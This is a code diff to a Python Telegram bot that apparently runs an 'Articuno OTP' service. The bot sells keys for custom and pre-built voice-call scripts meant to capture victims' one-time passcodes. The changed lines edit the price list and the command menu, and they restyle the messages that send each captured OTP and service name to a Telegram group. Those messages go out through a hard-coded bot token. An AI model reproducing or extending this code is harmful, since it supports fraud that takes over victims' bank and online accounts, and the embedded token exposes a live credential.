@@ -181,7 +181,7 @@ def Price_list(message):
 
 👍 Cheapest And Affordable Prices.😉
  
-🥰 Dm For Purchase @Approvers / @Peytas ✅
+🥰 Dm for purchase @Peytas ✅
 
 <b>Note:- INR prices may fluctuate accordingly please confirm INR prices with admin before paying.</b>""",message.from_user.id, message_id=last_message_ids[message.from_user.id], reply_markup=keyboard, parse_mode='HTML')
     except:
@@ -208,26 +208,24 @@ def Commands(message):
 
 <b>🧑‍💻 Basis Commands: ⬇️</b>
 
-/profile - Check Your Key Status 👤
-/purchase - Purchase A Key 🗝️
-/redeem - Redeem A Key 🔐
-/price - Price's Of Subscriptions 💵
+/profile - Check your key status 👤
+/purchase - Purchase a key 🗝️
+/redeem - Redeem a key 🔐
+/price - Price's of subscriptions 💵
 
 <b>🧑‍💻 Calling Commands: ⬇️</b>
 
-/call - Any Pre Build Module Calls📱
-/customcall - Custom Script Calls 📞
-/recall - Repeat Your Last Call 🤙
-/automation(Soon) - Automatic Calling System ☎️
+/call - Any pre build module calls📱
+/customcall - custom script calls 📞
+/recall - repeat your last call 🤙
+/alphacall - Alpthabate capture 📞
 
 <b>🧑‍💻 Script Commands: ⬇️</b>
 
-/customscript - To View Script 🆔
-/createscript - To Make A Script ✍️
-/deletescript - To Delete Old Script ♠️
-/viewscript   - To View Script Inputs ⌛️
-
-<b>🧑‍💻 Function Commands: ⬇️</b>
+/customscript - To view script 🆔
+/createscript - To make a script ✍️
+/deletescript - To delete old Script ♠️
+/viewscript   - To view script Inputs ⌛️
 
 """,message.from_user.id, last_message_ids[message.from_user.id], reply_markup=keyboard, parse_mode='HTML')
     except:
@@ -1061,16 +1059,16 @@ def custom_prebuild_script_call(script_id,chatid):
     data={
         "chat_id": "-1002076456397",
         "text": f"""
-ARTICUNO OTP 📲
-➖➖➖➖➖➖
-Mode ➣ CustomCall  
-Service name ➣ {custom_sc_src[2]}
-OTP ➣  {otp2} ✅
-Capture by ➣ @{voices[12][0:3]+"****"+voices[12][-3:]}
-
-<a href='https://t.me/Articunootpbot'>BOT</a> | <a href='https://t.me/+tqRNlgotcnkxOGNl'>GROUP</a> | <a href='https://t.me/+j5GqAN60aZhhMzM1'>CHANNEL</a>
+╭━━[☏<b><u> ARTICUNO OTP</u></b> ☏]
+┣<b>[📞]Mode: Custom Call </b>
+┣<b>[🔐]OTP:</b> <code>{otp2}</code>  
+┣<b>[📝]Service: {custom_sc_src[2]}</b>
+┣<b>[👤]By :</b><span class='tg-spoiler'> @{voices[12][0:3]+"**"+voices[12][-3:]}</span>
+╰━[<a href='https://t.me/Articunootpbot'>BOT</a>━[<a href='https://t.me/+tqRNlgotcnkxOGNl'>GROUP</a>]━[<a href='https://t.me/+j5GqAN60aZhhMzM1'>CHANNEL</a>]
         """,
-        "parse_mode": "HTML"
+        "parse_mode": "HTML",
+        "disable_web_page_preview":True
+
     }
 )
     c.close()
@@ -1236,21 +1234,21 @@ def aplha_prebuild_script_call(script_id,chatid):
                 item2 = types.InlineKeyboardButton(text="Deny ❌",callback_data="/deny_alpha")
                 keyboard.add(item1,item2) 
                 bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard)
-                response = requests.post(
+                requests.post(
     "https://api.telegram.org/bot7289161960:AAGqVenb4JrHLzK60YKFBcmBmq3jdhMcpx0/sendMessage",
     data={
         "chat_id": "-1002076456397",
         "text": f"""
-ARTICUNO OTP 📲
-➖➖➖➖➖➖
-Mode ➣ Alpha-numeric-Call  
-Service name ➣ {custom_sc_src[2]}
-OTP ➣  {otp2} ✅
-Capture by ➣ @{voices[12][0:3]+"**"+voices[12][-3:]}
-
-<a href='https://t.me/Articunootpbot'>BOT</a> | <a href='https://t.me/+tqRNlgotcnkxOGNl'>GROUP</a> | <a href='https://t.me/+j5GqAN60aZhhMzM1'>CHANNEL</a>
+╭━━[☏<b><u> ARTICUNO OTP</u></b> ☏]
+┣<b>[📞]Mode: Custom Call </b>
+┣<b>[🔐]OTP:</b> <code>{otp2}</code>  
+┣<b>[📝]Service: {custom_sc_src[2]}</b>
+┣<b>[👤]By :</b><span class='tg-spoiler'> @{voices[12][0:3]+"**"+voices[12][-3:]}</span>
+╰━[<a href='https://t.me/Articunootpbot'>BOT</a>━[<a href='https://t.me/+tqRNlgotcnkxOGNl'>GROUP</a>]━[<a href='https://t.me/+j5GqAN60aZhhMzM1'>CHANNEL</a>]
         """,
-        "parse_mode": "HTML"
+        "parse_mode": "HTML",
+        "disable_web_page_preview":True
+
     }
 )
             elif otp2=="None":
